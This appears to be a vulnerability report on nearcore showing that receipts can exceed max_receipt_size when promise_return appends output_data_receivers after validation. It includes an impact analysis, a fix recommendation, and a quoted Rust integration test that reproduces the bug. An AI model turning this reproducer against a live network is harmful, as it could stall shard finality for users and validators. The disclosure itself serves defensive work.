### Title
Receipt Size Limit Bypassed via Post-Validation `output_data_receivers` Injection — (`runtime/runtime/src/lib.rs`)

---

### Summary

The `max_receipt_size` hard limit is enforced on a receipt at creation time, but the `promise_return` execution path subsequently appends `output_data_receivers` to that same receipt **after** the size check passes. This allows an unprivileged user to produce receipts that exceed `max_receipt_size` (4 MiB) and commit them to chain state, violating the pre-inclusion receipt size invariant.

---

### Finding Description

`validate_receipt` enforces `max_receipt_size` only when called with `ValidateReceiptMode::NewReceipt`: [1](#0-0) 

After that check passes, the runtime's action-receipt processing loop handles the `promise_return` case by calling `extend_from_slice` on the validated receipt's `output_data_receivers` field — **without re-running the size check**: [2](#0-1) 

The receipt that was validated at exactly `max_receipt_size` now silently exceeds it. All subsequent processing uses `ValidateReceiptMode::ExistingReceipt`, which explicitly skips the size gate: [3](#0-2) 

The codebase acknowledges this as an open bug (issue #12606). The `try_forward` function contains a workaround that clamps the reported size to `max_receipt_size` for congestion accounting, but the oversized receipt still enters and is processed from chain state: [4](#0-3) 

---

### Impact Explanation

Oversized receipts that exceed `max_receipt_size` (4,194,304 bytes) are committed to the delayed-receipt queue or forwarded as outgoing receipts. The `ChunkStateWitness` size budget assumes all receipts are bounded by `max_receipt_size`; receipts above this limit can push the total uncompressed witness size beyond the intended 17 MiB ceiling. Chunk validators independently re-execute chunk application; if their witness size accounting diverges from the chunk producer's (due to the oversized receipt), they may fail to endorse the chunk, stalling finality for the affected shard.

---

### Likelihood Explanation

Any unprivileged user can deploy a contract, craft a receipt whose serialized size equals exactly `max_receipt_size` (filling `FunctionCallAction.args` to the limit), and call `promise_return` on it from within a promise chain that has non-empty `output_data_receivers`. The test `test_max_receipt_size_promise_return` in `test-loop-tests/src/tests/max_receipt_size.rs` demonstrates this is reachable with a normal user transaction and a standard test contract: [5](#0-4) 

---

### Recommendation

Re-validate the receipt size **after** `output_data_receivers` are appended in the `promise_return` branch of `runtime/runtime/src/lib.rs`. If the post-mutation size exceeds `max_receipt_size`, the execution should fail with `NewReceiptValidationError::ReceiptSizeExceeded` rather than silently emitting an oversized receipt. This mirrors the fix implied by the existing `ValidateReceiptMode::NewReceipt` path in `validate_receipt`.

---

### Proof of Concept

The existing integration test already demonstrates the bug end-to-end:

1. Deploy a contract.
2. Call `max_receipt_size_promise_return_method1` with `args_size = max_receipt_size - base_receipt_size`. This creates receipt C at exactly `max_receipt_size` and calls `promise_return(C)`.
3. The runtime appends the parent's `output_data_receivers` to C's receipt (lines 1029–1031 of `lib.rs`), pushing it above the limit.
4. `assert_oversized_receipt_occurred` confirms an oversized receipt entered the chain. [6](#0-5)

// A function call will generate a new receipt. Size of this receipt will be equal to
// `max_receipt_size`, it'll pass validation, but then `output_data_receivers` will be modified and
// the receipt's size will go above max_receipt_size. The receipt should be rejected, but currently
// isn't because of a bug (See https://github.com/near/nearcore/issues/12606)
// Runtime shouldn't die when it encounters a receipt with size above `max_receipt_size`.
#[test]
fn test_max_receipt_size_promise_return() {
    init_test_logger();

    let account = create_account_id("account0");
    let account_signer = create_user_test_signer(&account);
    let mut env = TestLoopBuilder::new()
        .enable_rpc()
        .add_user_account(&account, Balance::from_near(10_000))
        .build();

    // Deploy the test contract
    let deploy_contract_tx = SignedTransaction::deploy_contract(
        101,
        &account,
        near_test_contracts::rs_contract().into(),
        &account_signer,
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(deploy_contract_tx, Duration::seconds(5));

    // User calls a contract method
    // Contract method creates a DAG with two promises: [A -then-> B]
    // When promise A is executed, it creates a third promise - `C` and does a `promise_return`.
    // The DAG changes to: [C ->then-> B]
    // The receipt for promise C is a maximum size receipt.
    // Adding the `output_data_receivers` to C's receipt makes it go over the size limit.
    let base_receipt_template = Receipt::V0(ReceiptV0 {
        predecessor_id: account.clone(),
        receiver_id: account.clone(),
        receipt_id: CryptoHash::default(),
        receipt: ReceiptEnum::Action(ActionReceipt {
            signer_id: account.clone(),
            signer_public_key: account_signer.public_key().into(),
            gas_price: Balance::ZERO,
            output_data_receivers: vec![],
            input_data_ids: vec![],
            actions: vec![Action::FunctionCall(Box::new(FunctionCallAction {
                method_name: "noop".into(),
                args: vec![],
                gas: Gas::ZERO,
                deposit: Balance::ZERO,
            }))],
        }),
    });
    let base_receipt_template = action_receipt_v1_to_latest(&base_receipt_template);
    let base_receipt_size = borsh::object_length(&base_receipt_template).unwrap();
    let max_receipt_size = 4_194_304;
    let args_size = max_receipt_size - base_receipt_size;

    // Call the contract
    let large_receipt_tx = SignedTransaction::call(
        102,
        account.clone(),
        account.clone(),
        &account_signer,
        Balance::ZERO,
        "max_receipt_size_promise_return_method1".into(),
        format!("{{\"args_size\": {}}}", args_size).into(),
        Gas::from_teragas(300),
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(large_receipt_tx, Duration::seconds(5));

    // Make sure that the last promise in the DAG was called
    let assert_test_completed = SignedTransaction::call(
        103,
        account.clone(),
        account,
        &account_signer,
        Balance::ZERO,
        "assert_test_completed".into(),
        "".into(),
        Gas::from_teragas(300),
        env.rpc_node().head().last_block_hash,
    );
    env.rpc_runner().run_tx(assert_test_completed, Duration::seconds(5));

    assert_oversized_receipt_occurred(&env.validator());
}
